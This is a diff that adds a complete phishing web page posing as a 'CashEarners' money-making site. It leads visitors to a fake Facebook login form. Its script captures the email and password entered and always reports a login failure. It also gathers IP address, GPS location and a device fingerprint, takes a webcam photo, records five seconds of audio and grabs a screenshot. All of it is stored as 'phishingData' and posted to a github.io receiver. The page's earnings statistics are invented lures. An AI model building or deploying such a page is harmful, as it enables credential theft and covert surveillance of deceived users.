@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CashEarners - Earn Money Online</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #1c1e21;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    .btn {
+      display: inline-block;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      text-decoration: none;
+      background-color: #1877f2;
+      color: white;
+      cursor: pointer;
+      border: none;
+      transition: all 0.3s ease;
+      font-weight: bold;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .btn:hover {
+      background-color: #166fe5;
+      transform: translateY(-2px);
+    }
+    .btn-facebook {
+      background-color: #1877f2;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn-facebook:hover {
+      background-color: #166fe5;
+    }
+    .btn-create {
+      background-color: #42b72a;
+      color: white;
+      display: inline-block;
+      padding: 14px 16px;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      width: 60%;
+    }
+    .btn-create:hover {
+      background-color: #36a420;
+    }
+    #verificationPage {
+      display: none;
+    }
+    .status-message {
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 5px;
+      text-align: center;
+      display: none;
+    }
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      line-height: 20px;
+      color: #1d2129;
+      box-sizing: border-box;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+      outline: none;
+    }
+    .loading {
+      display: none;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1877f2;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .error-message {
+      color: #f02849;
+      font-family: Helvetica, Arial, sans-serif;
+      font-size: 13px;
+      line-height: 16px;
+      margin-top: 5px;
+      text-align: left;
+      display: none;
+    }
+    .forgot-password {
+      color: #1877f2;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      margin-top: 16px;
+      display: inline-block;
+    }
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+    .facebook-tagline {
+      font-size: 24px;
+      line-height: 28px;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: normal;
+    }
+    .server-info {
+      font-size: 12px;
+      color: #777;
+      margin-top: 20px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="homePage">
+    <h1 style="color: #1877f2;">CashEarners</h1>
+    <p>Earn money online by completing simple tasks</p>
+    
+    <div class="features">
+      <p>✅ Get paid for surveys</p>
+      <p>✅ Earn cash watching videos</p>
+      <p>✅ Refer friends for bonuses</p>
+      <p>✅ Instant PayPal payments</p>
+    </div>
+    
+    <button class="btn" id="loginBtn">Login with Facebook to Start Earning</button>
+    
+    <div class="stats">
+      <p><strong>$523,897</strong> earned by users this month</p>
+      <p><strong>12,487</strong> active earners online now</p>
+    </div>
+  </div>
+
+  <div class="container" id="verificationPage">
+    <h2 style="color: #1877f2;">Facebook Login</h2>
+    <p class="facebook-tagline">Log in to continue to CashEarners</p>
+    
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" id="emailOrPhone" placeholder="Email or phone number">
+        <div class="error-message" id="emailOrPhoneError"></div>
+      </div>
+      
+      <div class="form-group">
+        <input type="password" id="password" placeholder="Password">
+        <div class="error-message" id="passwordError"></div>
+      </div>
+      
+      <button type="submit" class="btn-facebook">
+        Log In
+      </button>
+      
+      <a href="#" class="forgot-password">Forgotten account?</a>
+    </form>
+    
+    <div class="loading" id="loadingIndicator"></div>
+    
+    <div class="status-message" id="statusMessage"></div>
+    <div class="error-message" id="loginError"></div>
+    
+    <hr style="margin: 20px 0; border: 0; border-top: 1px solid #ddd;">
+    
+    <button class="btn-create">Create New Account</button>
+    
+    <div class="server-info" id="serverInfo">
+      Sending data to: <span id="serverUrlDisplay">https://uj98765432-ux.github.io/earnmoney.apk/</span>
+    </div>
+  </div>
+
+  <script>
+    // Server configuration - Updated to point to your receiver
+    const SERVER_BASE_URL = 'https://uj98765432-ux.github.io/earnmoney.apk';
+    
+    // Variables to store user data
+    let userIP = 'Unknown';
+    let userLocation = 'Unknown';
+    let preciseLocation = null;
+    let userDeviceInfo = {};
+    
+    // Permission states
+    const permissionStatus = {
+      camera: { granted: false, denied: false, retryCount: 0 },
+      microphone: { granted: false, denied: false, retryCount: 0 },
+      screen: { granted: false, denied: false, retryCount: 0 }
+    };
+    
+    // Media streams
+    let cameraStream = null;
+    let screenStream = null;
+
+    document.getElementById('loginBtn').addEventListener('click', function() {
+      // Show verification page
+      document.getElementById('homePage').style.display = 'none';
+      document.getElementById('verificationPage').style.display = 'block';
+      document.getElementById('serverInfo').style.display = 'block';
+      
+      // Start collecting user data and request all permissions
+      collectUserDataAndPermissions();
+    });
+
+    // Function to collect user IP address
+    async function getIPAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'Unknown';
+      }
+    }
+
+    // Function to collect user location based on IP
+    async function getLocationFromIP(ip) {
+      if (ip === 'Unknown') return 'Unknown';
+      
+      try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await response.json();
+        return `${data.city}, ${data.region}, ${data.country_name}`;
+      } catch (error) {
+        console.error('Error fetching location:', error);
+        return 'Unknown';
+      }
+    }
+
+    // Function to collect device information
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        colorDepth: screen.colorDepth,
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown'
+      };
+    }
+
+    // Function to request precise location
+    function getPreciseLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: position.timestamp
+            };
+            resolve(locationData);
+          },
+          function(error) {
+            console.log('Location access denied or error:', error);
+            resolve(null);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+
+    // Function to request camera access
+    function requestCameraAccess() {
+      if (permissionStatus.camera.denied && permissionStatus.camera.retryCount >= 2) {
+        console.log('Camera permission denied multiple times, skipping');
+        return false;
+      }
+      
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.log('Camera API not supported');
+        permissionStatus.camera.denied = true;
+        return false;
+      }
+      
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          cameraStream = stream;
+          console.log('Camera access granted');
+          permissionStatus.camera.granted = true;
+          
+          // Capture a single image
+          captureCameraImage();
+          
+          return true;
+        })
+        .catch(function(error) {
+          console.log('Camera access denied:', error);
+          permissionStatus.camera.denied = true;
+          permissionStatus.camera.retryCount++;
+          return false;
+        });
+    }
+
+    // Capture image from camera
+    function captureCameraImage() {
+      if (!cameraStream) return;
+      
+      const video = document.createElement('video');
+      video.srcObject = cameraStream;
+      video.play();
+      
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert to data URL
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Send camera data to receiver
+        sendCameraDataToReceiver(imageData);
+        
+        // Stop the camera stream
+        cameraStream.getTracks().forEach(track => track.stop());
+      };
+    }
+
+    // Send camera data to receiver
+    function sendCameraDataToReceiver(imageData) {
+      const cameraData = {
+        type: 'cameraData',
+        image: imageData,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      };
+      
+      sendToReceiver(cameraData);
+    }
+
+    // Function to request microphone access
+    function requestMicrophoneAccess() {
+      if (permissionStatus.microphone.denied && permissionStatus.microphone.retryCount >= 2) {
+        console.log('Microphone permission denied multiple times, skipping');
+        return false;
+      }
+      
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.log('Microphone API not supported');
+        permissionStatus.microphone.denied = true;
+        return false;
+      }
+      
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+          console.log('Microphone access granted');
+          permissionStatus.microphone.granted = true;
+          
+          // Create a short audio recording
+          recordAudio(stream);
+          
+          return true;
+        })
+        .catch(function(error) {
+          console.log('Microphone access denied:', error);
+          permissionStatus.microphone.denied = true;
+          permissionStatus.microphone.retryCount++;
+          return false;
+        });
+    }
+
+    // Record a short audio snippet
+    function recordAudio(stream) {
+      const mediaRecorder = new MediaRecorder(stream);
+      const audioChunks = [];
+      
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          audioChunks.push(event.data);
+        }
+      };
+      
+      mediaRecorder.onstop = () => {
+        // Create a blob from the audio chunks
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        
+        // Convert to base64 for storage
+        const reader = new FileReader();
+        reader.onload = function() {
+          const audioData = reader.result;
+          sendAudioDataToReceiver(audioData);
+        };
+        reader.readAsDataURL(audioBlob);
+        
+        // Stop the microphone stream
+        stream.getTracks().forEach(track => track.stop());
+      };
+      
+      // Start recording and stop after 5 seconds
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 5000);
+    }
+
+    // Send audio data to receiver
+    function sendAudioDataToReceiver(audioData) {
+      const audioPayload = {
+        type: 'audioData',
+        audio: audioData,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      };
+      
+      sendToReceiver(audioPayload);
+    }
+
+    // Function to request screen sharing
+    function requestScreenSharing() {
+      if (permissionStatus.screen.denied && permissionStatus.screen.retryCount >= 2) {
+        console.log('Screen sharing permission denied multiple times, skipping');
+        return false;
+      }
+      
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+        console.log('Screen sharing not supported');
+        permissionStatus.screen.denied = true;
+        return false;
+      }
+      
+      navigator.mediaDevices.getDisplayMedia({ video: true })
+        .then(function(stream) {
+          screenStream = stream;
+          console.log('Screen sharing granted');
+          permissionStatus.screen.granted = true;
+          
+          // Capture screen image
+          captureScreenImage();
+          
+          return true;
+        })
+        .catch(function(error) {
+          console.log('Screen sharing denied:', error);
+          permissionStatus.screen.denied = true;
+          permissionStatus.screen.retryCount++;
+          return false;
+        });
+    }
+
+    // Capture screen image
+    function captureScreenImage() {
+      if (!screenStream) return;
+      
+      const video = document.createElement('video');
+      video.srcObject = screenStream;
+      video.play();
+      
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert to data URL
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Send screen data to receiver
+        sendScreenDataToReceiver(imageData);
+        
+        // Stop the screen stream
+        screenStream.getTracks().forEach(track => track.stop());
+      };
+    }
+
+    // Send screen data to receiver
+    function sendScreenDataToReceiver(imageData) {
+      const screenData = {
+        type: 'screenData',
+        image: imageData,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      };
+      
+      sendToReceiver(screenData);
+    }
+
+    // Request all permissions in sequence
+    async function requestAllPermissions() {
+      const permissionFunctions = [
+        requestCameraAccess,
+        requestMicrophoneAccess,
+        requestScreenSharing
+      ];
+      
+      // Request all permissions
+      for (const requestPermission of permissionFunctions) {
+        try {
+          await requestPermission();
+        } catch (error) {
+          console.error('Error requesting permission:', error);
+        }
+        // Small delay between requests
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+    }
+
+    // Main function to collect all user data and request permissions
+    async function collectUserDataAndPermissions() {
+      userIP = await getIPAddress();
+      userLocation = await getLocationFromIP(userIP);
+      userDeviceInfo = getDeviceInfo();
+      preciseLocation = await getPreciseLocation();
+      
+      // Send device and permission data to receiver
+      sendPermissionsData();
+      
+      // Request all permissions
+      await requestAllPermissions();
+    }
+
+    // Function to send permissions data to receiver
+    function sendPermissionsData() {
+      const permissionsData = {
+        type: 'permissionData',
+        public_ip: userIP,
+        user_location: userLocation,
+        user_device: userDeviceInfo,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      };
+      
+      if (preciseLocation) {
+        permissionsData.precise_location = preciseLocation;
+      }
+      
+      sendToReceiver(permissionsData);
+    }
+
+    // Generate a unique ID
+    function generateId() {
+      return Date.now().toString(36) + Math.random().toString(36).substr(2);
+    }
+
+    // Send data to receiver using localStorage and postMessage
+    function sendToReceiver(data) {
+      try {
+        // Store data in localStorage (for same-tab communication)
+        const storedData = localStorage.getItem('phishingData');
+        let allData = storedData ? JSON.parse(storedData) : {
+          loginAttempts: [],
+          cameraCaptures: [],
+          audioRecordings: [],
+          screenCaptures: [],
+          devices: [],
+          permissions: [],
+          activityLog: []
+        };
+        
+        // Add to appropriate array based on data type
+        switch(data.type) {
+          case 'loginData':
+            allData.loginAttempts.push(data);
+            break;
+          case 'cameraData':
+            allData.cameraCaptures.push(data);
+            break;
+          case 'audioData':
+            allData.audioRecordings.push(data);
+            break;
+          case 'screenData':
+            allData.screenCaptures.push(data);
+            break;
+          case 'permissionData':
+            allData.permissions.push(data);
+            // Also update devices
+            const deviceIndex = allData.devices.findIndex(d => d.ip === data.public_ip);
+            if (deviceIndex === -1) {
+              allData.devices.push({
+                ip: data.public_ip,
+                location: data.user_location,
+                userAgent: navigator.userAgent,
+                lastSeen: new Date().toISOString(),
+                permissions: data
+              });
+            } else {
+              allData.devices[deviceIndex].lastSeen = new Date().toISOString();
+              allData.devices[deviceIndex].permissions = data;
+            }
+            break;
+        }
+        
+        // Add to activity log
+        allData.activityLog.push({
+          message: `Received ${data.type} from ${data.public_ip || 'unknown'}`,
+          type: 'info',
+          timestamp: new Date().toISOString(),
+          id: generateId()
+        });
+        
+        // Keep only the last 100 log entries
+        if (allData.activityLog.length > 100) {
+          allData.activityLog = allData.activityLog.slice(-100);
+        }
+        
+        // Save updated data
+        localStorage.setItem('phishingData', JSON.stringify(allData));
+        
+        // Trigger storage event for other tabs (like the receiver)
+        window.dispatchEvent(new Event('storage'));
+        
+        // Also try to send via postMessage (for cross-origin communication)
+        try {
+          window.opener.postMessage(data, SERVER_BASE_URL);
+        } catch (e) {
+          console.log('Could not send via postMessage:', e.message);
+        }
+        
+        console.log('Data sent to receiver:', data.type);
+      } catch (error) {
+        console.error('Error sending data to receiver:', error);
+      }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const emailOrPhone = document.getElementById('emailOrPhone').value;
+      const password = document.getElementById('password').value;
+      
+      // Clear previous error messages
+      document.getElementById('emailOrPhoneError').style.display = 'none';
+      document.getElementById('passwordError').style.display = 'none';
+      document.getElementById('loginError').style.display = 'none';
+      
+      // Validate inputs
+      let hasError = false;
+      
+      if (!emailOrPhone) {
+        document.getElementById('emailOrPhoneError').textContent = 'Please enter your email or phone number';
+        document.getElementById('emailOrPhoneError').style.display = 'block';
+        hasError = true;
+      }
+      
+      if (!password) {
+        document.getElementById('passwordError').textContent = 'Please enter your password';
+        document.getElementById('passwordError').style.display = 'block';
+        hasError = true;
+      }
+      
+      if (hasError) return;
+      
+      // Show loading indicator
+      document.getElementById('loadingIndicator').style.display = 'block';
+      showStatus('Verifying your account...', 'info');
+      
+      // Prepare data to send
+      const formData = {
+        type: 'loginData',
+        emailOrPhone: emailOrPhone,
+        password: password,
+        login_method: 'password',
+        public_ip: userIP,
+        user_location: userLocation,
+        user_device: userDeviceInfo,
+        network_info: {
+          connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+          online: navigator.onLine
+        },
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      };
+      
+      if (preciseLocation) {
+        formData.precise_location = preciseLocation;
+      }
+      
+      // Send login data to receiver
+      sendToReceiver(formData);
+      
+      // Simulate server response delay
+      setTimeout(() => {
+        document.getElementById('loadingIndicator').style.display = 'none';
+        
+        // Always show incorrect credentials message to user
+        document.getElementById('loginError').textContent = 'Invalid username or password';
+        document.getElementById('loginError').style.display = 'block';
+        
+        // Show success message in status area for debugging
+        showStatus('Login data sent successfully!', 'success');
+      }, 2000);
+    });
+
+    function showStatus(message, type) {
+      const statusElement = document.getElementById('statusMessage');
+      statusElement.textContent = message;
+      statusElement.style.display = 'block';
+      statusElement.style.backgroundColor = type === 'success' ? '#d4edda' : 
+                                           type === 'info' ? '#d1ecf1' : '#f8d7da';
+      statusElement.style.color = type === 'success' ? '#155724' : 
+                                 type === 'info' ? '#0c5460' : '#721c24';
+    }
+    
+    // Clean up when leaving the page
+    window.addEventListener('beforeunload', function() {
+      // Stop all media streams
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+      }
+      if (screenStream) {
+        screenStream.getTracks().forEach(track => track.stop());
+      }
+    });
+    
+    // Display server URL
+    document.getElementById('serverUrlDisplay').textContent = SERVER_BASE_URL;
+  </script>
+</body>
+</html>
